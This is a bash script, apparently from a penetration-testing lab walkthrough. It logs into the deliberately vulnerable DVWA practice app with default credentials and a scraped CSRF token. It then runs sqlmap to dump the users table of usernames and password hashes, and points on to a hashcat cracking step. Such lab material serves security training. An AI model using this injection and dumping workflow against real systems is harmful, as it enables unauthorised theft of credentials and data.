#!/bin/bash
# sqli.sh — real SQL injection against the DVWA target (Case 03).
#
# Modern DVWA (cytopia/dvwa) escapes /login.php input, so the old
# "tautology bypass on the login form" no longer applies. The injection now
# lives in the SQLi module, reachable once authenticated:
#
#   Step 1: log in as admin/password (CSRF token + session cookie).
#   Step 2: sqlmap pushes a boolean-based UNION dump through
#           /vulnerabilities/sqli/ and returns the users table
#           (username / MD5 hash rows) — exactly the data the walkthrough
#           dumps in Case 03.
#
# Requires DVWA to be set up once first:
#   open http://localhost:8080/setup.php -> "Create / Reset Database"
set -u

DVWA_URL="${1:-http://192.168.10.20}"
CJ=/tmp/dvwa.cookies
rm -f "$CJ"

echo "======================================================================"
echo "[1/2] authenticate as admin/password (DVWA master escapes login input,"
echo "      so the injection point is the SQLi module in Step 2)"
echo "======================================================================"
TOKEN=$(curl -s -c "$CJ" "$DVWA_URL/login.php" \
  | grep -o "user_token' value='[^']*'" | head -n1 | sed "s/.*value='//; s/'//")
if [ -z "$TOKEN" ]; then
  echo "FAILED: could not find the login CSRF token (DVWA not reachable?)" >&2
  exit 1
fi
echo "      session + CSRF token grabbed"
curl -s -b "$CJ" -c "$CJ" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=password" \
  --data-urlencode "Login=Login" \
  --data-urlencode "user_token=$TOKEN" \
  "$DVWA_URL/login.php" -o /dev/null -w "      login POST -> %{http_code}\n"
echo "      (302 => logged in)"

echo
echo "======================================================================"
echo "[2/2] sqlmap dumps the users table via the SQLi module"
echo "======================================================================"
sqlmap -u "$DVWA_URL/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --load-cookies "$CJ" \
  --batch \
  --dbms mysql --threads=3 \
  --technique=B --risk=1 --level=2 \
  --dump -T users | tail -n 30

echo
echo "[*] copy the dumped hashes to /tmp/hashes.txt, then:"
echo "    hashcat-run.sh"